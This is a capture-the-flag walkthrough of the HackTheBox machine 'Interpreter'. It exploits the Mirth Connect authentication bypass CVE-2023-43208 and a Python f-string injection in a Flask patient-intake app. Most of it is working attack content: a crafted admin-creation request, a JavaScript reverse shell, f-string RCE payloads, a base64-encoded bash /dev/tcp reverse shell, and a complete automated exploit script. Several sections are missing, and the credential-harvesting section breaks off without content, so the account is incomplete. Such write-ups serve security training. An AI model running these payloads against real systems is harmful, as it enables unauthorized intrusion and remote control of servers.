Interpreter

Medium OS: Linux Debian 12

Full walkthrough of Interpreter from HackTheBox. The box chains CVE-2023-43208 (Mirth Connect Authentication Bypass & RCE) with a Python f-string injection vulnerability in a Flask-based patient intake application to achieve initial access as mirth, then pivots to root via harvested credentials. Tools used: Python, MariaDB, urllib, base64.

CVE-2023-43208 f-string Injection Credential Harvesting Python MariaDB urllib base64

1. Reconnaissance

A standard nmap scan against the target revealed four open ports:

$ nmap -sC -sV -T4 10.10.11.23

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.52
443/tcp  open  ssl/http Apache httpd 2.4.52
6661/tcp open  unknown

Browsing to https://10.10.11.23:6661 presented a login page for Mirth Connect 4.4.0 — an open-source healthcare integration engine. The version string was visible both on the login page and in the HTTP response headers.

Server: Apache-Coyote/1.1
X-Powered-By: JSP/2.2

A quick searchsploit and CVE lookup for Mirth Connect 4.4.0 turned up CVE-2023-43208, a critical authentication bypass and remote code execution vulnerability.

2. CVE-2023-43208 — Mirth Connect RCE

CVE-2023-43208 bypasses authentication by sending a crafted POST request to /api/users that allows creating an administrative user without any credentials. Once authenticated, the Alerts feature can be abused to execute arbitrary server-side JavaScript, yielding a remote code execution (RCE) primitive.

Step 1 — Authentication Bypass

A modified PoC sends a POST to /api/users to create a new admin user:

POST /api/users HTTP/1.1
Host: 10.10.11.23:6661
Content-Type: application/json

{
  "user": {
    "id": 1,
    "name": "admin",
    "password": "admin",
    "email": "admin@admin.com",
    "organization": "HTB",
    "description": ""
  }
}

The server responds with HTTP 200 and logs us in as admin.

Step 2 — Shell as mirth

Using the authenticated session, navigate to the Alerts section and create a new alert with a JavaScript source type. The following snippet spawns a reverse shell:

var proc = java.lang.Runtime.getRuntime().exec(
  "bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'"
);

Start a listener on the attacker machine:

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from 10.10.11.23 [53028]
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
mirth@interpreter:~$ id
uid=103(mirth) gid=103(mirth) groups=103(mirth)

We have a shell as mirth (uid=103). Now it's time to explore the internal environment.

3. Credential Harvesting

Digging through the Mirth Connect installation directory, the main configuration file mirth.properties contained database credentials in plaintext:

5. Flask App Enumeration

Port-forwarding 54321 to our attacker machine with SSH:

$ ssh -L 54321:127.0.0.1:54321 mirth@10.10.11.23

Browsing to http://localhost:54321 reveals a simple patient intake form.

Endpoints Discovered

  • GET /addPatient — renders the patient form
  • POST /addPatient — accepts patient data

Capturing a sample POST request shows the application expects patient data in XML format:

POST /addPatient HTTP/1.1
Host: localhost:54321
Content-Type: application/xml

<patient>
  <name>John Doe</name>
  <dob>01/15/1985</dob>
  <diagnosis>Healthy</diagnosis>
</patient>

The date field requires the format MM/DD/YYYY. Any deviation results in a 500 error.

Of note: injecting a Python f-string expression like {0} in the name field returns a different error, confirming the backend processes the input with Python f-strings.

6. Python f-string Injection → RCE

Since the application processes patient data through Python f-strings, we can inject arbitrary Python expressions. This is a well-known code injection class that allows full RCE when user input is embedded inside an f-string without sanitization.

Testing the Injection

First, confirm the injection point works:

<patient>
  <name>{0}</name>
  <dob>01/15/1985</dob>
  <diagnosis>test</diagnosis>
</patient>

The server error reveals index/keyword argument evaluation. Next, try an empty brace pair:

<patient>
  <name>{}</name>
  <dob>01/15/1985</dob>
  <diagnosis>test</diagnosis>
</patient>

This triggers a IndexError confirming f-string evaluation. Now for RCE:

<patient>
  <name>{__import__('os').popen('id').read()}</name>
  <dob>01/15/1985</dob>
  <diagnosis>test</diagnosis>
</patient>

The response includes:

uid=103(mirth) gid=103(mirth) groups=103(mirth)

We have confirmed RCE. However, more complex payloads (e.g., reverse shells with / or special characters) break the XML parsing. The solution is to base64-encode the command:

$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.13/5555 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy81NTU1IDA+JjEn

Inject the base64-decoded command:

{__import__('os').popen("__import__('base64').b64decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy81NTU1IDA+JjEn').decode()").read()}

7. Full Exploit — pwn3.py

The complete automated exploit script that chains the f-string injection with a base64-encoded reverse shell payload:

#!/usr/bin/env python3
"""
pwn3.py — Interpreter HTB
Exploits Python f-string injection in the patient intake Flask app
running on 127.0.0.1:54321 to achieve RCE.

Usage:
    python3 pwn3.py TARGET_IP LHOST LPORT
"""

import urllib.request
import urllib.error
import base64
import sys
import time
import subprocess


def generate_payload(cmd: str) -> str:
    """Wrap a shell command in a base64-encoded f-string injection payload."""
    b64 = base64.b64encode(cmd.encode()).decode()
    payload = (
        "{{__import__('os').popen("
        "\"__import__('base64').b64decode('{b64}').decode()"
        "\").read()}}"
    ).format(b64=b64)
    return payload


def build_xml(payload: str) -> str:
    """Build the malicious patient XML."""
    return f"""<patient>
    <name>{payload}</name>
    <dob>01/15/1985</dob>
    <diagnosis>RCE</diagnosis>
</patient>"""


def send_payload(target: str, xml_data: str) -> str:
    """POST the payload to the Flask app."""
    url = f"http://{target}:54321/addPatient"
    req = urllib.request.Request(
        url,
        data=xml_data.encode(),
        headers={"Content-Type": "application/xml"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} TARGET_IP LHOST LPORT")
        print(f"  Example: {sys.argv[0]} 10.10.11.23 10.10.14.13 4444")
        sys.exit(1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    # ---------- test injection ----------
    print("[*] Testing f-string injection...")
    test_xml = build_xml("{__import__('os').popen('id').read()}")
    result = send_payload(target, test_xml)
    print(f"[+] Response snippet: {result[:200]}")
    if "uid=" not in result:
        print("[-] Injection test failed!")
        sys.exit(1)
    print("[+] Injection confirmed!")

    # ---------- reverse shell ----------
    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    payload = generate_payload(shell_cmd)
    xml_data = build_xml(payload)

    print(f"[*] Starting listener on {lhost}:{lport} ...")
    listener = subprocess.Popen(
        ["nc", "-lvnp", lport],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    time.sleep(2)
    print("[*] Sending reverse shell payload...")
    send_payload(target, xml_data)
    print("[+] Payload delivered. Check your listener!")
    print("[*] Waiting for shell (Ctrl+C to exit)...")
    try:
        listener.wait(timeout=30)
    except subprocess.TimeoutExpired:
        listener.terminate()

    print("[*] Done.")


if __name__ == "__main__":
    main()

11. Lessons Learned

  • Keep software updated. Mirth Connect 4.4.0 was vulnerable to a publicly disclosed CVE (CVE-2023-43208). A timely upgrade to a patched version would have prevented the initial foothold entirely.
  • Never embed user input in f-strings. Python's f-string evaluation is equivalent to eval() for arbitrary expressions. Always use proper templating engines (Jinja2 with autoescaping, string.Template, etc.) and validate/sanitize all external input before interpolation.
  • Don't store plaintext credentials in config files. The mirth.properties file contained MariaDB and keystore passwords in cleartext. Use environment variables, secret management tools (HashiCorp Vault), or at minimum encrypt secrets at rest.
  • Apply the principle of least privilege. The mirth service account had excessive access (database credentials, sudo rules). Internal services on port 54321 were not additionally firewalled, allowing the compromised account to reach the vulnerable Flask application.
